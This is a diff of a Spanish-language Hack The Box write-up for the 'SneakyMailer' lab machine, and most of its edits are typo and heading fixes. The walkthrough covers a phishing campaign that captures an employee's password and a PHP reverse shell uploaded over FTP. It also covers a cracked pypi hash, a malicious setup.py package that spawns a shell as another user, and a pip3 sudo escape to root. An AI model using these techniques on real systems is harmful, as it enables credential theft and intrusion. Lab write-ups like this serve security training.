@@ -8,15 +8,13 @@ image: /htb/sneakymailer/sneakymailer.png
 
 ---
 
-
 ## Resumen
 
-`SneakyMailer` es una máquina nivel intermedio bastante interesante, con el primer barrido de nmap encontraremos un nuevo dominio `sneakycorp.htb` que en su sitio web contiene numerosos `emails` los cuales tendremos que hacerles un ataque de `phishing` para obtener el password que usaremos en el servidor `smtp`.
+`SneakyMailer` es una máquina nivel intermedio bastante interesante. Con el primer barrido de nmap encontraremos un nuevo dominio `sneakycorp.htb` que en su sitio web contiene numerosos `emails` los cuales tendremos que hacerles un ataque de `phishing` para obtener el password que usaremos en el servidor `smtp`.
 
 Luego de revisar los correos encontramos otras credenciales, que usaremos en el servidor `FTP`. Nos damos cuenta que podemos subir un reverse shell php y así alcanzar el RCE, pero con otro dominio que tuvimos que encontrar haciendo fuzzing `dev.sneakycorp.htb`. 
 
-Entramos como `www-data` y nos topamos con un hash del `pypiserver`. Lo que hicimos fue subir un paquete con nuestro payload al servidor que nos sirvió para conseguir el user.txt como low. El próximo paso para obtener nuestro preciado root.txt es bastante sencillo, ya que podemos ejecutar pip3 como sudo, usando las técnicas de `gtfobins` somos capaces de obtener nuestra shell como ¡`Root`!
-
+Entramos como `www-data` y nos topamos con un hash del `pypiserver`. Lo que hicimos fue subir un paquete con nuestro payload al servidor que nos sirvió para conseguir el user.txt como low. El próximo paso para obtener nuestro preciado root.txt es bastante sencillo, ya que podemos ejecutar pip3 como sudo, usando las técnicas de `gtfobins` somos capaces de obtener nuestra shell como ¡`Root`!.
 
 ---
 
@@ -25,11 +23,9 @@ Entramos como `www-data` y nos topamos con un hash del `pypiserver`. Lo que hici
 <asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
 <script type="text/javascript" src="/assets/js/asciinema-player.js"></script>
 
-
 ---
 
 ## Reconocimiento
-
 
 Acá nos damos cuenta de varias cosas bastante útiles, la primera es que está corriendo ftp, un servidor de correo y además descubrimos un dominio **sneakycorp.htb** que corre en el puerto 80 http. Otra de las cosas que me llamo la atención fue que el puerto 8080 está abierto, pero por ahora no sabemos que está corriendo. ¡Sigamos!
 
@@ -74,17 +70,13 @@ Ok, agregamos el nuevo dominio al archivo hosts y exploramos un poco a ver que n
 
 ```console
 kali@kali:~$ sudo nano /etc/hosts
-
-```
-
-```console
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.10.197    sneakycorp.htb
 ```
 
-En la seccion de team `http://sneakycorp.htb/team.php` nos vamos a encontrar con un monton de cuentas emails con el siguiente dominio `sneakymailer.htb`
-Agregamos tambien a el archivo hosts 
+En la sección de team `http://sneakycorp.htb/team.php` nos vamos a encontrar con un montón de cuentas emails con el siguiente dominio `sneakymailer.htb`
+lo agregamos también a el archivo hosts. 
 
 ```console
 127.0.0.1       localhost
@@ -92,19 +84,16 @@ Agregamos tambien a el archivo hosts
 10.10.10.197    sneakycorp.htb sneakymailer.htb
 ```
 
-Podemos extraer facilmente las cuentas de correos con esta aplicacion `https://email-checker.net/extract-email`
-Hacemos ctrl + a, 
-![Desktop View](/htb/sneakymailer/emails.png)
-copiamos y pegamos en la herramienta 
-![Desktop View](/htb/sneakymailer/email2.png)
-y extraer
+Podemos extraer fácilmente las cuentas de correos con esta aplicación. `https://email-checker.net/extract-email`
+Hacemos ctrl + a 
+copiamos y pegamos en la herramienta y extraemos.
 ![Desktop View](/htb/sneakymailer/email3.png)
 
 Lo guardamos todo en un archivo llamado emails.txt
 
 ![Desktop View](/htb/sneakymailer/saved_emails.png)
 
-Lo que vamos a hacer ahora es probar si podemos mandar correos a esos usuarios, con una herramienta llamada [**Swaks**](https://github.com/jetmore/swaks) ***(Swiss Army Knife for SMTP)***
+Lo que vamos a hacer ahora es probar si podemos mandar correos a esos usuarios, con una herramienta llamada [**Swaks**](https://github.com/jetmore/swaks) ***(Swiss Army Knife for SMTP).***
 
 ```console
 kali@sneakymailer$ swaks --from "testing@sneakymailer.htb" --body "Prueba" --to tigernixon@sneakymailer.htb
@@ -149,12 +138,12 @@ kali@sneakymailer$ swaks --from "testing@sneakymailer.htb" --body "Prueba" --to 
 === Connection closed with remote host.
 ```
 
-Perfecto el correo se envio exitosamente. 
+Perfecto el correo se envió exitosamente. 
 
 
 ## Phishing a los empleados
 
-Podemos automatizar esta tarea haciendo un script en python para poder enviarle el phishing a cada usuario. Entonces nuestro codigo seria algo asi: 
+Podemos automatizar esta tarea haciendo un script en python para poder enviarle el phishing a cada usuario. Entonces nuestro código sería algo así: 
 
 ```python
 #!/usr/bin/env python                               
@@ -172,27 +161,27 @@ for emails in lista_emails:
 
 ```
 
-Nos ponemos a la escucha en el puerto `8080` para capturar cualquier respuesta 
+Nos ponemos a la escucha en el puerto `8080` para capturar cualquier respuesta.
 
 ```console
 kali@kali:~$ nc -lvnp 8080
 listening on [any] 8080 ...
 ```
 
-Muy bien, parece que paulbyrd accedio al link 
+Muy bien, parece que paulbyrd accedió al link. 
 
 <asciinema-player src="/htb/sneakymailer/email.cast" cols="100" rows="20"></asciinema-player>
 
 ```console
 firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
 ```
-Decodeamos el passowrd con  [**urldecoder**](https://www.urldecoder.org/) y ya con esto ya tendriamos nuestras primeras credenciales ``paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``
+Decodeamos el passowrd con  [**urldecoder**](https://www.urldecoder.org/) y ya con esto ya tendríamos nuestras primeras credenciales ``paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``
 
 ---
 
 ## IMAP
 
-Ya que las credenciales no funcionaron  con el ftp lo que hice fue intentar acceder al servidor imap en el puerto 143 y revisar si existe alguna informacion valiosa en los correos
+Ya que las credenciales no funcionaron  con el ftp lo que hice fue intentar acceder al servidor imap en el puerto 143 y revisar si existe alguna información valiosa en los correos.
 
 ```console
 kali@kali:~$ nc sneakycorp.htb 143
@@ -225,7 +214,7 @@ kali@kali:~$ nc sneakycorp.htb 143
 1 OK LIST completed
 ```
 
-Tenemos 2 correos en "Inbox/Sent Items" veamos que hay dentro
+Tenemos 2 correos en "Inbox/Sent Items" veamos que hay dentro.
 
 `02 SELECT "INBOX.Sent Items"`
 
@@ -277,7 +266,7 @@ Please notify me when you do i=
 
 03 OK FETCH completed.
 ```
-Email 2: Este email es bastante interesante, seguro nos servira para mas tarde. 
+Email 2: Este email es bastante interesante, seguro nos servirá para más tarde. 
 
 `03 FETCH 2 BODY[]`
 
@@ -307,7 +296,7 @@ find in our PyPI service, let me know if you have any inconvenience.
  ```
 ---
 
-##FTP
+## FTP
 
 FTP Credenciales: `Username: developer Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`
 
@@ -339,11 +328,11 @@ drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
 226 Directory send OK.
  ```
 
-Intente subir una reverse shell y acceder a traves de http://sneakycorp.htb/0xdeed.php pero no estaba ahi, por lo tanto llegue a la conclusion de que debe estar en otro dominio o subdominio. 
+Intente subir una reverse shell y acceder a través de http://sneakycorp.htb/0xdeed.php pero no estaba ahi, por lo tanto llegue a la conclusión de que debe estar en otro dominio o subdominio. 
 
-##Fuzzing Host 
+## Fuzzing Host 
 
-Utilizamos wfuzz para encontrar el subdominio, y tal como esperabamos es `dev.sneakycorp.htb`
+Utilizamos wfuzz para encontrar el subdominio, y tal como esperábamos es `dev.sneakycorp.htb`.
 ```console
 wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197/ -w /usr/share/wordlists/dirb/common.txt --hh 173,185
 ```
@@ -367,7 +356,7 @@ ID           Response   Lines    Word     Chars       Payload
 000001241:   200        340 L    989 W    13737 Ch    "dev"
  ```
 
-Agregamos  a nuestro archivo hosts. 
+Agregamos a nuestro archivo hosts. 
 
 ```console
 127.0.0.1       localhost
@@ -375,9 +364,9 @@ Agregamos  a nuestro archivo hosts.
 10.10.10.197    sneakycorp.htb sneakymailer.htb  dev.sneakycorp.htb
 ```
 
-y ahora accedemos al servidor ftp con el nuevo subdomnio y comprobamos que ahora si podemos acceder al archivo y por lo tanto obtener nuestra shell.
+Y ahora accedemos al servidor ftp con el nuevo subdominio y comprobamos que ahora si podemos acceder al archivo y por lo tanto obtener nuestra shell.
 
-##LFI TO RCE 
+## LFI TO RCE 
 
 ```console
 kali@kali:~$ ftp dev.sneakycorp.htb
@@ -415,7 +404,7 @@ drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
 
 ---
 
-##User.txt
+## User.txt
 triggereamos en `http://dev.sneakycorp.htb/0xdeed.php` y ¡Listo! tenemos la primera shell. 
 
 ```console
@@ -429,14 +418,14 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-###user developer
+### user developer
 Podemos hacer un `su` hacia el usuario developer con las mismas credenciales
 ```console
 www-data@sneakymailer:/$ su developer
 Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 developer@sneakymailer:/$ 
 ```
-###Enumeración
+### Enumeración
 Al rato de echar un vistazo y enumerar me encuentro con los siguientes usuarios:
 
 ```console
@@ -447,7 +436,7 @@ low:x:1000:1000:,,,:/home/low:/bin/bash
 developer@sneakymailer:/$ 
 ```
 
-Me llamo mucho la atencion el usuario pypi con el dominio pypi.sneakycorp.htb normalmente el servidor pypi corre en el puerto 8080, ahora sabemos que servicio es. 
+Me llamo mucho la atención el usuario pypi con el dominio `pypi.sneakycorp.htb` normalmente el servidor pypi corre en el puerto `8080`, ahora sabemos qué servicio es. 
 
 ```console
 127.0.0.1       localhost
@@ -456,9 +445,9 @@ Me llamo mucho la atencion el usuario pypi con el dominio pypi.sneakycorp.htb no
 ```
 
 ![Desktop View](/htb/sneakymailer/pipy.png)
+---
 
-
-Para seguir avanzando hacia adelante tire un linenum.sh para ver si encontraba algo, y efectivamente encontramos el hash del usuario pypi 
+Para seguir avanzando tire un linenum.sh para ver si encontraba algo, y efectivamente encontramos el hash del usuario pypi 
 ```console
 htpasswd
 
@@ -467,8 +456,9 @@ htpasswd
 	pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 
 ```
+---
 
-###Cracking el hash de pypi con John
+### Cracking el hash de pypi con John
 
 ```console
 root@kali:/home/kali# john hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -484,7 +474,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-OK, tenemos la contraseña de el usuario `pypi:soufianeelhaoui`. Antes de continuar hagamos una pausa y recordemos lo que decia el segundo email que encontramos en imap
+OK, tenemos la contraseña de el usuario `pypi:soufianeelhaoui`. Antes de continuar hagamos una pausa y recordemos lo que decía el segundo email que encontramos en imap
 
 ```console
 Hello low
@@ -493,15 +483,14 @@ Your current task is to install, test and then erase every python module you
 find in our PyPI service, let me know if you have any inconvenience.
 ```
 
-Basicamente lo que le esta diciendo a low es que su tarea es probar y borrar cada modulo de python que encuentre en el servicio PyPi que esta corriendo en el puerto 8080. 
-Y esto es bastante curioso, porque podriamos crear un paquete, subirlo y low debera probarlo. Entonces lo que haremos es meter nuestro payload en ese paquete maligno, para conseguir la shell como low.
+Básicamente lo que le está diciendo a low es que su tarea es probar y borrar cada módulo de python que encuentre en el servicio PyPi que está corriendo en el puerto 8080. 
+Y esto es bastante curioso, porque podríamos crear un paquete, subirlo y low deberá probarlo. Entonces lo que haremos es meter nuestro payload en ese paquete maligno, para conseguir la shell como low.
 
-
-Luego de leer un poco la documentación podemos ponernos manos a la obra.[**pipyserver**](https://pypi.org/project/pypiserver/)
+Luego de leer un poco la documentación podemos ponernos manos a la obra. [**pipyserver**](https://pypi.org/project/pypiserver/)
 Necesitaremos crear 2 archivos esenciales
 
 `.pypirc`: Este archivo almacena inicios de sesión y contraseñas para autenticar sus cuentas. Normalmente se almacena en su directorio personal.
-`setup.py`: Aqui ira nuestro codigo malicioso.
+`setup.py`: Aquí ira nuestro código malicioso.
 
 ![Desktop View](/htb/sneakymailer/pyprc.png)
 
@@ -545,8 +534,7 @@ setuptools.setup(
 
 
 ```
-
-Nos ponemos a la escucha en nuestra maquina:
+Nos ponemos a la escucha en nuestra máquina:
 ```console
 python3 -m http.server 4242
 ```
@@ -574,7 +562,6 @@ drwxrwxrwx 3 developer developer 4096 Dec  4 12:15 ..
 -rw-rw-rw- 1 developer developer  748 Dec  4 12:13 setup.py
 developer@sneakymailer:~$ 
 ```
-
 Tenemos los dos archivos, ahora podemos subirlos usando el siguiente comando: `python3 setup.py sdist upload -r sneakycorp`
 ```console
 kali@kali:~/Documents/hackthebox/sneakymailer/paquete$ nc -lvnp 4848
@@ -584,7 +571,6 @@ whoami
 developer
 ```
 Obtenemos el reverse shell pero aun somos developer, porque se esta ejecutando 2 veces primero como developer y luego low lo ejecuta, como solo queremos que low sea el que lo ejecute hagamos un pequeño truco, sabemos que el uid del usuario low es 1000, entonces el comando solo se ejecutara si el uid corresponde con el de low.
-
 
 ```python
 #!/usr/bin/python3
@@ -617,8 +603,6 @@ setuptools.setup(
 
 
 ```
-
-
 subimos con el siguiente comando: 
 ```console
 python3 setup.py sdist register -r sneakycorp upload -r sneakycorp
@@ -631,19 +615,15 @@ connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 37728
 whoami
 low
 ```
-
-Para trabajar de manera mas comoda lo que hice fue usar el authorized_key para poder logearme sin password usando mi llave publica de ssh
-
+Para trabajar de manera más cómoda lo que hice fue usar el authorized_key para poder logearme sin password usando mi llave publica de ssh
 ```console
 low@sneakymailer:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpgc1wqbZzNPSqfx/IePt0CU0e3yDPt5OAKTkAMmpGCy8BH/pRa1RqGPHm6uI2j0i7mEwnKElcqQRllUwDltLY17mmJp+GdxAqJq8QJpCHY+1fujuONJgok5DR8pCrJW4RbydM0Xvn3c8wmduxN/cbfXuHjCT8bc+UzzQ3yaFdBnkLmuZIYbVtWZ3T9UPQlBSHow4lGpm+2ahxmXBhgNTOg8udPzH+eJxSx2dShdLGbf1VJjVX92sqt0MuT7wmSBqdTFk8B4Isc0XamT1SCu50OGTUT0dMfXKyGuQ2rcXozCKvaLBfclvp09edGw28iJIfQHbrh89IdQALvZZc1nTuOvFm3HXAPJJQ+lghYrzbvWIXgypSwLC4Gr57O4cBXcTembHcTQYPqa5UYK/2EKep/u/oYgJUhntspI+jyG7n0ioNKduDSFDu1OdVHS0rOh7TpywMU7eyCHZ1iDNPZ7+c7TZd8Ooh9mrYdRwaOEUYw2bNm2Rb0RGtNa6LgTR0dLU= kali@kali" > authorized_keys
 ```
 
 <asciinema-player src="/htb/sneakymailer/user.cast" cols="107" rows="24"></asciinema-player>
-
 ---
 
-
-##root.txt
+## root.txt
 
 Lo primero que hice fue tirar un `sudo -l` 
 ```console
@@ -656,7 +636,7 @@ Matching Defaults entries for low on sneakymailer:
 User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3
  ```
-
+### GTFObins pip3
 Y para mi sorpresa podemos ejecutar pip3 como root. Busque en los gtfobins a ver si podemos bypassear el pip3 para obtener la shell y efectivamente podemos [**pip3 gtfobins**]( https://gtfobins.github.io/gtfobins/pip/)
 
 Lo que vamos a hacer es muy sencillo solo seguiremos los pasos, en la maquina de sneakymailer vamos a ejecutar lo siguiente:
@@ -668,8 +648,6 @@ sudo pip3 install $TF
  ```
 
 <asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
-
-
 ---
 
 ![Desktop View](/htb/sneakymailer/sneaky.gif)
@@ -677,7 +655,6 @@ sudo pip3 install $TF
 ---
 
 ## Recursos 
-
 
 | Topics                      | 
 |:-----------------------------|
